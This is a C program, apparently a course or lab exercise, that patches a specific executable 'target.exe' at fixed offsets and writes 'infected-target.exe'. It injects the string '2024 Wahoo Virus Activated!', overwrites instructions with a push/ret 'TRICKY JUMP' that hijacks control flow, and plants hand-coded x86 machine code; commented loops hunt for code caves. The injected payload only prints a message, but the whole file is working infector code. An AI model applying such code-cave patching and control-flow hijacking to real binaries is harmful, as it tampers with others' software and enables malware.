#include <stdio.h>
#include <stdlib.h>


int main(){
	

	//I want to put all of the file into an array
	const size_t fileSize = 7328;


	FILE *file = fopen("target.exe", "rb");
	if(file==NULL){
		printf("FILE IS NULL");
		return 1;
	}
	

	//use malloc to allocate memory for the array
	unsigned char *buffer = (unsigned char *) malloc(fileSize * sizeof(unsigned char));
	if(buffer==NULL){
		printf("BUFFER IS NULL");
		return 1;
	}

	size_t bytesRead = fread(buffer, sizeof(unsigned char), fileSize, file);
	if(bytesRead < fileSize){
		if(feof(file)){
			printf("Reached end of file too soon");
		} else if (ferror(file)){
			printf("error reading file");
			return 1;
		}
	}
	
	fclose(file);
		
	/*
	for(size_t i=2000; i<fileSize; i++){
		
		if(buffer[i]==0x0){
			
			//printf("%d\n", (int) i);

		
			int nonZero = 0;
			for(int j = i+1; j < i+50 && j < fileSize; j++){
				if(buffer[j] !=0x0){
					nonZero=1;
					break;
				}
			}
			if(nonZero==0){
				printf("%d",(int) i);
				break;
			}
			
		}
	}
	*/


		/*
		
		if(buffer[i] == 0xe8){
		       
			if(buffer[i+1] == 0xa8){

				if(buffer[i+2] == 0xfe && buffer[i+3]==0xff){
					printf("%d", (int) i);
				}
			}
		}
		
	

	*/


	char str[] = "        2024 Wahoo Virus Activated!";
	int howBigIsI = 0;
	for(int i = 0; str[i] != '\0'; i++){
		buffer[1841+i] = str[i];
		howBigIsI=i;
	}
	buffer[1842+howBigIsI] = 0x00;

	//printf("%x", buffer[1165]);	
	
	
	
	//TRICKY JUMP	

	buffer[1171]=0x68;
	buffer[1172]=0x3b;
	buffer[1173]=0x84;
	buffer[1174]=0x04;
	buffer[1175]=0x08;
	buffer[1176]=0xc3;

	//what was supposed to be there
	
	buffer[1177]=0xb8;
	buffer[1178]=0x21;
	buffer[1179]=0x0;
	buffer[1180]=0x0;
	buffer[1181]=0x0;
	buffer[1182]=0xc3;
	


	//for(int j=1170; j < 1183; j++){

	
	int hexArray[] = {0x55, 0x89, 0xe5, 0x83, 0xec, 0x18, 0xc7, 0x4, 0x24, 0x31, 0x87, 0x4, 0x8, 0xe8, 0x93, 0xfe, 0xff, 0xff, 0xc9, 0xc3};

	int size = sizeof(hexArray) / sizeof(hexArray[0]);
	//printf("array size: %d", size);
	for(int k=0; k < size; k++){
	       buffer[1083+k]=hexArray[k];
      	}	       




	//WORKING PRINT BUFFER TO FILE
	
	FILE *file2 =fopen("infected-target.exe", "wb");
	if(file2 == NULL){
		printf("ERROR OPENING WRITE FILE");
		return 1;
	}

	size_t bytesWritten = fwrite(buffer, sizeof(unsigned char), fileSize, file2);
	if(bytesWritten < fileSize){
		printf("ERROR WRITING TO FILE");
		return 1;
	}
	
	fclose(file2);




	/*
	for(size_t i=0; i < fileSize; i++){
		printf("%02x",buffer[i]);
	}
	*/

	/*
	unsigned char readByte;

	while(fread(&readByte, sizeof(unsigned char), 1, file) == 1){
		printf("%02x ", readByte);
	}

	printf("\n");
	*/


	free(buffer);
	

	return 0;
}
